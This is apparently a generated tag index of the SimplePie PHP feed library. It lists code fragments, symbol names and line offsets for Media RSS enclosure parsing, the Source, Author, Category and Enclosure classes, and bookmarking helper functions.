								$copyrights =& new $this->feed->copyright_class($copyright_url, $copyright_label);copyrights4689,138455
								$copyright_url = null;copyright_url4693,138646
								$copyright_label = null;copyright_label4694,138677
									$copyright_url = $this->sanitize($group['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['copyright'][0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_url4697,138824
									$copyright_label = $this->sanitize($group['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['copyright'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_label4701,139088
								$copyrights =& new $this->feed->copyright_class($copyright_url, $copyright_label);copyrights4703,139240
								$copyrights = $copyrights_parent;copyrights4707,139361
									$credit_role = null;credit_role4715,139614
									$credit_scheme = null;credit_scheme4716,139644
									$credit_name = null;credit_name4717,139676
										$credit_role = $this->sanitize($credit['attribs']['']['role'], SIMPLEPIE_CONSTRUCT_TEXT);credit_role4720,139769
										$credit_scheme = $this->sanitize($credit['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);credit_scheme4724,139945
										$credit_scheme = 'urn:ebu';credit_scheme4728,140085
										$credit_name = $this->sanitize($credit['data'], SIMPLEPIE_CONSTRUCT_TEXT);credit_name4732,140182
									$credits = array_values(SimplePie_Misc::array_unique($credits));credits4738,140428
									$credit_role = null;credit_role4745,140704
									$credit_scheme = null;credit_scheme4746,140734
									$credit_name = null;credit_name4747,140766
										$credit_role = $this->sanitize($credit['attribs']['']['role'], SIMPLEPIE_CONSTRUCT_TEXT);credit_role4750,140859
										$credit_scheme = $this->sanitize($credit['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);credit_scheme4754,141035
										$credit_scheme = 'urn:ebu';credit_scheme4758,141175
										$credit_name = $this->sanitize($credit['data'], SIMPLEPIE_CONSTRUCT_TEXT);credit_name4762,141272
									$credits = array_values(SimplePie_Misc::array_unique($credits));credits4768,141518
								$credits = $credits_parent;credits4773,141632
								$description = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['description'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);description4779,141791
								$description = $this->sanitize($group['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['description'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);description4783,142034
								$description = $description_parent;description4787,142203
									$value = null;value4795,142451
									$algo = null;algo4796,142475
										$value = $this->sanitize($hash['data'], SIMPLEPIE_CONSTRUCT_TEXT);value4799,142544
										$algo = $this->sanitize($hash['attribs']['']['algo'], SIMPLEPIE_CONSTRUCT_TEXT);algo4803,142693
										$algo = 'md5';algo4807,142820
									$hashes = array_values(SimplePie_Misc::array_unique($hashes));hashes4813,142946
									$value = null;value4820,143214
									$algo = null;algo4821,143238
										$value = $this->sanitize($hash['data'], SIMPLEPIE_CONSTRUCT_TEXT);value4824,143307
										$algo = $this->sanitize($hash['attribs']['']['algo'], SIMPLEPIE_CONSTRUCT_TEXT);algo4828,143456
										$algo = 'md5';algo4832,143583
									$hashes = array_values(SimplePie_Misc::array_unique($hashes));hashes4838,143709
								$hashes = $hashes_parent;hashes4843,143821
									$temp = explode(',', $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['keywords'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT));temp4851,144073
									$keywords = array_values(SimplePie_Misc::array_unique($keywords));keywords4860,144388
									$temp = explode(',', $this->sanitize($group['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['keywords'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT));temp4867,144672
									$keywords = array_values(SimplePie_Misc::array_unique($keywords));keywords4876,144985
								$keywords = $keywords_parent;keywords4881,145101
								$player = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['player'][0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_IRI);player4887,145252
								$player = $this->sanitize($group['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['player'][0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_IRI);player4891,145493
								$player = $player_parent;player4895,145665
									$rating_scheme = null;rating_scheme4903,145910
									$rating_value = null;rating_value4904,145942
										$rating_scheme = $this->sanitize($rating['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);rating_scheme4907,146038
										$rating_scheme = 'urn:simple';rating_scheme4911,146178
										$rating_value = $this->sanitize($rating['data'], SIMPLEPIE_CONSTRUCT_TEXT);rating_value4915,146278
									$ratings = array_values(SimplePie_Misc::array_unique($ratings));ratings4921,146512
									$rating_scheme = null;rating_scheme4928,146788
									$rating_value = null;rating_value4929,146820
										$rating_scheme = $this->sanitize($rating['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);rating_scheme4932,146916
										$rating_scheme = 'urn:simple';rating_scheme4936,147056
										$rating_value = $this->sanitize($rating['data'], SIMPLEPIE_CONSTRUCT_TEXT);rating_value4940,147156
									$ratings = array_values(SimplePie_Misc::array_unique($ratings));ratings4946,147390
								$ratings = $ratings_parent;ratings4951,147504
									$restriction_relationship = null;restriction_relationship4959,147771
									$restriction_type = null;restriction_type4960,147814
									$restriction_value = null;restriction_value4961,147849
										$restriction_relationship = $this->sanitize($restriction['attribs']['']['relationship'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_relationship4964,147961
										$restriction_type = $this->sanitize($restriction['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_type4968,148166
										$restriction_value = $this->sanitize($restriction['data'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_value4972,148340
									$restrictions = array_values(SimplePie_Misc::array_unique($restrictions));restrictions4978,148634
									$restriction_relationship = null;restriction_relationship4985,148935
									$restriction_type = null;restriction_type4986,148978
									$restriction_value = null;restriction_value4987,149013
										$restriction_relationship = $this->sanitize($restriction['attribs']['']['relationship'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_relationship4990,149125
										$restriction_type = $this->sanitize($restriction['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_type4994,149330
										$restriction_value = $this->sanitize($restriction['data'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_value4998,149504
									$restrictions = array_values(SimplePie_Misc::array_unique($restrictions));restrictions5004,149798
								$restrictions = $restrictions_parent;restrictions5009,149922
									$thumbnails = array_values(SimplePie_Misc::array_unique($thumbnails));thumbnails5021,150347
									$thumbnails = array_values(SimplePie_Misc::array_unique($thumbnails));thumbnails5032,150794
								$thumbnails = $thumbnails_parent;thumbnails5037,150914
								$title = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['title'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);title5043,151068
								$title = $this->sanitize($group['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['title'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);title5047,151293
								$title = $title_parent;title5051,151450
						$bitrate = null;bitrate5068,152273
						$channels = null;channels5069,152296
						$duration = null;duration5070,152320
						$expression = null;expression5071,152344
						$framerate = null;framerate5072,152370
						$height = null;height5073,152395
						$javascript = null;javascript5074,152417
						$lang = null;lang5075,152443
						$length = null;length5076,152463
						$medium = null;medium5077,152485
						$samplingrate = null;samplingrate5078,152507
						$type = null;type5079,152535
						$url = null;url5080,152555
						$width = null;width5081,152574
						$captions = null;captions5084,152614
						$categories = null;categories5085,152638
						$copyrights = null;copyrights5086,152664
						$credits = null;credits5087,152690
						$description = null;description5088,152713
						$hashes = null;hashes5089,152740
						$keywords = null;keywords5090,152762
						$player = null;player5091,152786
						$ratings = null;ratings5092,152808
						$restrictions = null;restrictions5093,152831
						$thumbnails = null;thumbnails5094,152859
						$title = null;title5095,152885
							$bitrate = $this->sanitize($content['attribs']['']['bitrate'], SIMPLEPIE_CONSTRUCT_TEXT);bitrate5100,153024
							$channels = $this->sanitize($content['attribs']['']['channels'], SIMPLEPIE_CONSTRUCT_TEXT);channels5104,153191
							$duration = $this->sanitize($content['attribs']['']['duration'], SIMPLEPIE_CONSTRUCT_TEXT);duration5108,153360
							$duration = $duration_parent;duration5112,153486
							$expression = $this->sanitize($content['attribs']['']['expression'], SIMPLEPIE_CONSTRUCT_TEXT);expression5116,153595
							$framerate = $this->sanitize($content['attribs']['']['framerate'], SIMPLEPIE_CONSTRUCT_TEXT);framerate5120,153769
							$height = $this->sanitize($content['attribs']['']['height'], SIMPLEPIE_CONSTRUCT_TEXT);height5124,153938
							$lang = $this->sanitize($content['attribs']['']['lang'], SIMPLEPIE_CONSTRUCT_TEXT);lang5128,154099
							$length = ceil($content['attribs']['']['fileSize']);length5132,154260
							$medium = $this->sanitize($content['attribs']['']['medium'], SIMPLEPIE_CONSTRUCT_TEXT);medium5136,154388
							$samplingrate = $this->sanitize($content['attribs']['']['samplingrate'], SIMPLEPIE_CONSTRUCT_TEXT);samplingrate5140,154557
							$type = $this->sanitize($content['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);type5144,154730
							$width = $this->sanitize($content['attribs']['']['width'], SIMPLEPIE_CONSTRUCT_TEXT);width5148,154888
							$url = $this->sanitize($content['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_IRI);url5152,155046
								$caption_type = null;caption_type5161,155443
								$caption_lang = null;caption_lang5162,155473
								$caption_startTime = null;caption_startTime5163,155503
								$caption_endTime = null;caption_endTime5164,155538
								$caption_text = null;caption_text5165,155571
									$caption_type = $this->sanitize($caption['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);caption_type5168,155663
									$caption_lang = $this->sanitize($caption['attribs']['']['lang'], SIMPLEPIE_CONSTRUCT_TEXT);caption_lang5172,155836
									$caption_startTime = $this->sanitize($caption['attribs']['']['start'], SIMPLEPIE_CONSTRUCT_TEXT);caption_startTime5176,156010
									$caption_endTime = $this->sanitize($caption['attribs']['']['end'], SIMPLEPIE_CONSTRUCT_TEXT);caption_endTime5180,156188
									$caption_text = $this->sanitize($caption['data'], SIMPLEPIE_CONSTRUCT_TEXT);caption_text5184,156348
								$captions = array_values(SimplePie_Misc::array_unique($captions));captions5190,156632
							$captions = $captions_parent;captions5195,156743
								$term = null;term5203,157002
								$scheme = null;scheme5204,157024
								$label = null;label5205,157048
									$term = $this->sanitize($category['data'], SIMPLEPIE_CONSTRUCT_TEXT);term5208,157119
									$scheme = $this->sanitize($category['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);scheme5212,157273
									$scheme = 'http://search.yahoo.com/mrss/category_schema';scheme5216,157404
									$label = $this->sanitize($category['attribs']['']['label'], SIMPLEPIE_CONSTRUCT_TEXT);label5220,157545
							$categories = array_values(SimplePie_Misc::array_unique(array_merge($categories, $categories_parent)));categories5227,157823
							$categories = array_values(SimplePie_Misc::array_unique($categories));categories5231,157987
							$categories = array_values(SimplePie_Misc::array_unique($categories_parent));categories5235,158125
							$categories = null;categories5239,158237
							$copyright_url = null;copyright_url5245,158380
							$copyright_label = null;copyright_label5246,158410
								$copyright_url = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['copyright'][0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_url5249,158556
								$copyright_label = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['copyright'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_label5253,158820
							$copyrights =& new $this->feed->copyright_class($copyright_url, $copyright_label);copyrights5255,158972
							$copyrights = $copyrights_parent;copyrights5259,159089
								$credit_role = null;credit_role5267,159335
								$credit_scheme = null;credit_scheme5268,159364
								$credit_name = null;credit_name5269,159395
									$credit_role = $this->sanitize($credit['attribs']['']['role'], SIMPLEPIE_CONSTRUCT_TEXT);credit_role5272,159485
									$credit_scheme = $this->sanitize($credit['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);credit_scheme5276,159657
									$credit_scheme = 'urn:ebu';credit_scheme5280,159793
									$credit_name = $this->sanitize($credit['data'], SIMPLEPIE_CONSTRUCT_TEXT);credit_name5284,159886
								$credits = array_values(SimplePie_Misc::array_unique($credits));credits5290,160126
							$credits = $credits_parent;credits5295,160235
							$description = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['description'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);description5301,160389
							$description = $description_parent;description5305,160556
								$value = null;value5313,160797
								$algo = null;algo5314,160820
									$value = $this->sanitize($hash['data'], SIMPLEPIE_CONSTRUCT_TEXT);value5317,160886
									$algo = $this->sanitize($hash['attribs']['']['algo'], SIMPLEPIE_CONSTRUCT_TEXT);algo5321,161031
									$algo = 'md5';algo5325,161154
								$hashes = array_values(SimplePie_Misc::array_unique($hashes));hashes5331,161274
							$hashes = $hashes_parent;hashes5336,161381
								$temp = explode(',', $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['keywords'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT));temp5344,161626
								$keywords = array_values(SimplePie_Misc::array_unique($keywords));keywords5353,161932
							$keywords = $keywords_parent;keywords5358,162043
							$player = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['player'][0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_IRI);player5364,162189
							$player = $player_parent;player5368,162359
								$rating_scheme = null;rating_scheme5376,162597
								$rating_value = null;rating_value5377,162628
									$rating_scheme = $this->sanitize($rating['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);rating_scheme5380,162721
									$rating_scheme = 'urn:simple';rating_scheme5384,162857
									$rating_value = $this->sanitize($rating['data'], SIMPLEPIE_CONSTRUCT_TEXT);rating_value5388,162953
								$ratings = array_values(SimplePie_Misc::array_unique($ratings));ratings5394,163181
							$ratings = $ratings_parent;ratings5399,163290
								$restriction_relationship = null;restriction_relationship5407,163550
								$restriction_type = null;restriction_type5408,163592
								$restriction_value = null;restriction_value5409,163626
									$restriction_relationship = $this->sanitize($restriction['attribs']['']['relationship'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_relationship5412,163735
									$restriction_type = $this->sanitize($restriction['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_type5416,163936
									$restriction_value = $this->sanitize($restriction['data'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_value5420,164106
								$restrictions = array_values(SimplePie_Misc::array_unique($restrictions));restrictions5426,164394
							$restrictions = $restrictions_parent;restrictions5431,164513
								$thumbnails = array_values(SimplePie_Misc::array_unique($thumbnails));thumbnails5443,164927
							$thumbnails = $thumbnails_parent;thumbnails5448,165042
							$title = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['title'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);title5454,165191
							$title = $title_parent;title5458,165346
					$bitrate = null;bitrate5471,166013
					$channels = null;channels5472,166035
					$duration = null;duration5473,166058
					$expression = null;expression5474,166081
					$framerate = null;framerate5475,166106
					$height = null;height5476,166130
					$javascript = null;javascript5477,166151
					$lang = null;lang5478,166176
					$length = null;length5479,166195
					$medium = null;medium5480,166216
					$samplingrate = null;samplingrate5481,166237
					$type = null;type5482,166264
					$url = null;url5483,166283
					$width = null;width5484,166301
					$url = $this->sanitize($link['attribs']['']['href'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($link));url5486,166322
						$type = $this->sanitize($link['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);type5489,166483
						$length = ceil($link['attribs']['']['length']);length5493,166632
					$bitrate = null;bitrate5506,167529
					$channels = null;channels5507,167551
					$duration = null;duration5508,167574
					$expression = null;expression5509,167597
					$framerate = null;framerate5510,167622
					$height = null;height5511,167646
					$javascript = null;javascript5512,167667
					$lang = null;lang5513,167692
					$length = null;length5514,167711
					$medium = null;medium5515,167732
					$samplingrate = null;samplingrate5516,167753
					$type = null;type5517,167780
					$url = null;url5518,167799
					$width = null;width5519,167817
					$url = $this->sanitize($link['attribs']['']['href'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($link));url5521,167838
						$type = $this->sanitize($link['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);type5524,167999
						$length = ceil($link['attribs']['']['length']);length5528,168148
					$bitrate = null;bitrate5541,168961
					$channels = null;channels5542,168983
					$duration = null;duration5543,169006
					$expression = null;expression5544,169029
					$framerate = null;framerate5545,169054
					$height = null;height5546,169078
					$javascript = null;javascript5547,169099
					$lang = null;lang5548,169124
					$length = null;length5549,169143
					$medium = null;medium5550,169164
					$samplingrate = null;samplingrate5551,169185
					$type = null;type5552,169212
					$url = null;url5553,169231
					$width = null;width5554,169249
					$url = $this->sanitize($enclosure[0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($enclosure[0]));url5556,169270
						$type = $this->sanitize($enclosure[0]['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);type5559,169454
						$length = ceil($enclosure[0]['attribs']['']['length']);length5563,169619
	function get_latitude()get_latitude5589,171539
	function get_longitude()get_longitude5605,171955
	function get_source()get_source5625,172503
	function add_to_service($item_url, $title_url = null, $summary_url = null)add_to_service5646,173013
	function add_to_service($item_url, $title_url = null, $summary_url = null)title_url5646,173013
			$return = $item_url . rawurlencode($this->get_permalink());return5650,173135
	function add_to_blinklist()add_to_blinklist5667,173576
	function add_to_blogmarks()add_to_blogmarks5672,173737
	function add_to_delicious()add_to_delicious5677,173872
	function add_to_digg()add_to_digg5682,173988
	function add_to_furl()add_to_furl5687,174107
	function add_to_magnolia()add_to_magnolia5692,174215
	function add_to_myweb20()add_to_myweb205697,174338
	function add_to_newsvine()add_to_newsvine5702,174470
	function add_to_reddit()add_to_reddit5707,174585
	function add_to_segnalo()add_to_segnalo5712,174694
	function add_to_simpy()add_to_simpy5717,174812
	function add_to_spurl()add_to_spurl5722,174934
	function add_to_wists()add_to_wists5727,175052
	function search_technorati()search_technorati5732,175159
class SimplePie_SourceSimplePie_Source5738,175267
	var $item;item5740,175292
	var $data = array();data5741,175304
	var $data = array();data5741,175304
	function SimplePie_Source($item, $data)SimplePie_Source5743,175327
		$this->item = $item;item5745,175371
		$this->data = $data;data5746,175394
	function __toString()__toString5749,175421
	function get_source_tags($namespace, $tag)get_source_tags5754,175489
	function get_base($element = array())get_base5766,175682
	function sanitize($data, $type, $base = '')sanitize5771,175770
	function sanitize($data, $type, $base = '')base5771,175770
	function get_item()get_item5776,175875
	function get_title()get_title5781,175925
	function get_category($key = 0)get_category5817,177353
		$categories = $this->get_categories();categories5819,177389
	function get_categories()get_categories5830,177534
		$categories = array();categories5832,177564
			$term = null;term5836,177691
			$scheme = null;scheme5837,177708
			$label = null;label5838,177727
				$term = $this->sanitize($category['attribs']['']['term'], SIMPLEPIE_CONSTRUCT_TEXT);term5841,177798
				$scheme = $this->sanitize($category['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);scheme5845,177947
				$label = $this->sanitize($category['attribs']['']['label'], SIMPLEPIE_CONSTRUCT_TEXT);label5849,178099
			$term = $this->sanitize($category['data'], SIMPLEPIE_CONSTRUCT_TEXT);term5857,178527
				$scheme = $this->sanitize($category['attribs']['']['domain'], SIMPLEPIE_CONSTRUCT_TEXT);scheme5860,178655
				$scheme = null;scheme5864,178766
	function get_author($key = 0)get_author5887,179470
		$authors = $this->get_authors();authors5889,179504
	function get_authors()get_authors5900,179637
		$authors = array();authors5902,179664
			$name = null;name5905,179783
			$uri = null;uri5906,179800
			$email = null;email5907,179816
				$name = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name5910,179919
				$uri = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]));uri5914,180129
				$email = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email5918,180412
			$name = null;name5927,180772
			$url = null;url5928,180789
			$email = null;email5929,180805
				$name = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name5932,180911
				$url = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]));url5936,181127
				$email = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email5940,181419
	function get_contributor($key = 0)get_contributor5970,182495
		$contributors = $this->get_contributors();contributors5972,182534
	function get_contributors()get_contributors5983,182687
		$contributors = array();contributors5985,182719
			$name = null;name5988,182853
			$uri = null;uri5989,182870
			$email = null;email5990,182886
				$name = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name5993,182994
				$uri = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]));uri5997,183214
				$email = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email6001,183512
			$name = null;name6010,183906
			$url = null;url6011,183923
			$email = null;email6012,183939
				$name = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name6015,184047
				$url = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]));url6019,184267
				$email = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email6023,184565
	function get_link($key = 0, $rel = 'alternate')get_link6041,184980
	function get_link($key = 0, $rel = 'alternate')rel6041,184980
		$links = $this->get_links($rel);links6043,185032
	function get_permalink()get_permalink6057,185243
	function get_links($rel = 'alternate')get_links6062,185305
						$link_rel = (isset($link['attribs']['']['rel'])) ? $link['attribs']['']['rel'] : 'alternate';link_rel6073,185594
						$link_rel = (isset($link['attribs']['']['rel'])) ? $link['attribs']['']['rel'] : 'alternate';link_rel6084,186021
			$keys = array_keys($this->data['links']);keys6103,186931
	function get_description()get_description6136,187958
	function get_copyright()get_copyright6180,189814
	function get_language()get_language6208,190827
	function get_latitude()get_latitude6232,191507
	function get_longitude()get_longitude6248,191927
	function get_image_url()get_image_url6268,192481
class SimplePie_AuthorSimplePie_Author6289,193099
	var $name;name6291,193124
	var $link;link6292,193136
	var $email;email6293,193148
	function SimplePie_Author($name = null, $link = null, $email = null)SimplePie_Author6296,193202
	function SimplePie_Author($name = null, $link = null, $email = null)link6296,193202
		$this->name = $name;name6298,193275
		$this->link = $link;link6299,193298
		$this->email = $email;email6300,193321
	function __toString()__toString6303,193350
	function get_name()get_name6309,193446
	function get_link()get_link6321,193564
	function get_email()get_email6333,193682
class SimplePie_CategorySimplePie_Category6346,193805
	var $term;term6348,193832
	var $scheme;scheme6349,193844
	var $label;label6350,193858
	function SimplePie_Category($term = null, $scheme = null, $label = null)SimplePie_Category6353,193912
	function SimplePie_Category($term = null, $scheme = null, $label = null)scheme6353,193912
		$this->term = $term;term6355,193989
		$this->scheme = $scheme;scheme6356,194012
		$this->label = $label;label6357,194039
	function __toString()__toString6360,194068
	function get_term()get_term6366,194164
	function get_scheme()get_scheme6378,194282
	function get_label()get_label6390,194406
class SimplePie_EnclosureSimplePie_Enclosure6403,194542
	var $bitrate;bitrate6405,194570
	var $captions;captions6406,194585
	var $categories;categories6407,194601
	var $channels;channels6408,194619
	var $copyright;copyright6409,194635
	var $credits;credits6410,194652
	var $description;description6411,194667
	var $duration;duration6412,194686
	var $expression;expression6413,194702
	var $framerate;framerate6414,194720
	var $handler;handler6415,194737
	var $hashes;hashes6416,194752
	var $height;height6417,194766
	var $javascript;javascript6418,194780
	var $keywords;keywords6419,194798
	var $lang;lang6420,194814
	var $length;length6421,194826
	var $link;link6422,194840
	var $medium;medium6423,194852
	var $player;player6424,194866
	var $ratings;ratings6425,194880
	var $restrictions;restrictions6426,194895
	var $samplingrate;samplingrate6427,194915
	var $thumbnails;thumbnails6428,194935
	var $title;title6429,194953
	var $type;type6430,194966
	var $width;width6431,194978
	function SimplePie_Enclosure($link = null, $type = null, $length = null, $javascript = null, $bitrate = null, $captions = null, $categories = null, $channels = null, $copyright = null, $credits = null, $description = null, $duration = null, $expression = null, $framerate = null, $hashes = null, $height = null, $keywords = null, $lang = null, $medium = null, $player = null, $ratings = null, $restrictions = null, $samplingrate = null, $thumbnails = null, $title = null, $width = null)SimplePie_Enclosure6434,195032
	function SimplePie_Enclosure($link = null, $type = null, $length = null, $javascript = null, $bitrate = null, $captions = null, $categories = null, $channels = null, $copyright = null, $credits = null, $description = null, $duration = null, $expression = null, $framerate = null, $hashes = null, $height = null, $keywords = null, $lang = null, $medium = null, $player = null, $ratings = null, $restrictions = null, $samplingrate = null, $thumbnails = null, $title = null, $width = null)type6434,195032
		$this->bitrate = $bitrate;bitrate6436,195523
		$this->captions = $captions;captions6437,195552
		$this->categories = $categories;categories6438,195583
		$this->channels = $channels;channels6439,195618
		$this->copyright = $copyright;copyright6440,195649
		$this->credits = $credits;credits6441,195682
		$this->description = $description;description6442,195711
		$this->duration = $duration;duration6443,195748
		$this->expression = $expression;expression6444,195779
		$this->framerate = $framerate;framerate6445,195814
		$this->hashes = $hashes;hashes6446,195847
		$this->height = $height;height6447,195874
		$this->javascript = $javascript;javascript6448,195901
		$this->keywords = $keywords;keywords6449,195936
		$this->lang = $lang;lang6450,195967
		$this->length = $length;length6451,195990
		$this->link = $link;link6452,196017
		$this->medium = $medium;medium6453,196040
		$this->player = $player;player6454,196067
		$this->ratings = $ratings;ratings6455,196094
		$this->restrictions = $restrictions;restrictions6456,196123
		$this->samplingrate = $samplingrate;samplingrate6457,196162
		$this->thumbnails = $thumbnails;thumbnails6458,196201
		$this->title = $title;title6459,196236
		$this->type = $type;type6460,196261
		$this->width = $width;width6461,196284
			$idn =& new idna_convert;idn6464,196349
			$parsed = SimplePie_Misc::parse_url($link);parsed6465,196378
			$this->link = SimplePie_Misc::compress_parse_url($parsed['scheme'], $idn->encode($parsed['authority']), $parsed['path'], $parsed['query'], $parsed['fragment']);link6466,196425
		$this->handler = $this->get_handler(); // Needs to load lasthandler6468,196593
	function __toString()__toString6471,196660
	function get_bitrate()get_bitrate6477,196756
	function get_caption($key = 0)get_caption6489,196883
		$captions = $this->get_captions();captions6491,196918
	function get_captions()get_captions6502,197055
	function get_category($key = 0)get_category6514,197185
		$categories = $this->get_categories();categories6516,197221
	function get_categories()get_categories6527,197366
	function get_channels()get_channels6539,197502
	function get_copyright()get_copyright6551,197632
	function get_credit($key = 0)get_credit6563,197765
		$credits = $this->get_credits();credits6565,197799
	function get_credits()get_credits6576,197932
	function get_description()get_description6588,198059
	function get_duration($convert = false)get_duration6600,198198
				$time = SimplePie_Misc::time_hms($this->duration);time6606,198300
	function get_expression()get_expression6620,198463
	function get_extension()get_extension6632,198601
			$url = SimplePie_Misc::parse_url($this->link);url6636,198662
	function get_framerate()get_framerate6645,198828
	function get_handler()get_handler6657,198961
	function get_hash($key = 0)get_hash6662,199029
		$hashes = $this->get_hashes();hashes6664,199061
	function get_hashes()get_hashes6675,199190
	function get_height()get_height6687,199314
	function get_language()get_language6699,199438
	function get_keyword($key = 0)get_keyword6711,199560
		$keywords = $this->get_keywords();keywords6713,199595
	function get_keywords()get_keywords6724,199732
	function get_length()get_length6736,199862
	function get_link()get_link6748,199986
	function get_medium()get_medium6760,200115
	function get_player()get_player6772,200239
	function get_rating($key = 0)get_rating6784,200363
		$ratings = $this->get_ratings();ratings6786,200397
	function get_ratings()get_ratings6797,200530
	function get_restriction($key = 0)get_restriction6809,200657
		$restrictions = $this->get_restrictions();restrictions6811,200696
	function get_restrictions()get_restrictions6822,200849
	function get_sampling_rate()get_sampling_rate6834,200991
	function get_size()get_size6846,201134
		$length = $this->get_length();length6848,201158
	function get_thumbnail($key = 0)get_thumbnail6859,201295
		$thumbnails = $this->get_thumbnails();thumbnails6861,201332
	function get_thumbnails()get_thumbnails6872,201477
	function get_title()get_title6884,201613
	function get_type()get_type6896,201734
	function get_width()get_width6908,201852
	function native_embed($options='')native_embed6920,201973
	function embed($options = '', $native = false)embed6928,202170
	function embed($options = '', $native = false)native6928,202170
		$audio = '';audio6931,202242
		$video = '';video6932,202257
		$alt = '';alt6933,202272
		$altclass = '';altclass6934,202285
		$loop = 'false';loop6935,202303
		$width = 'auto';width6936,202322
		$height = 'auto';height6937,202341
		$bgcolor = '#ffffff';bgcolor6938,202361
		$mediaplayer = '';mediaplayer6939,202385
		$widescreen = false;widescreen6940,202406
		$handler = $this->get_handler();handler6941,202429
		$type = $this->get_real_type();type6942,202464
			$options = explode(',', $options);options6951,202620
				$opt = explode(':', $option, 2);opt6954,202695
							$audio = $opt[1];audio6962,202880
							$video = $opt[1];video6966,202940
							$alt = $opt[1];alt6970,202998
							$altclass = $opt[1];altclass6974,203059
							$loop = $opt[1];loop6978,203121
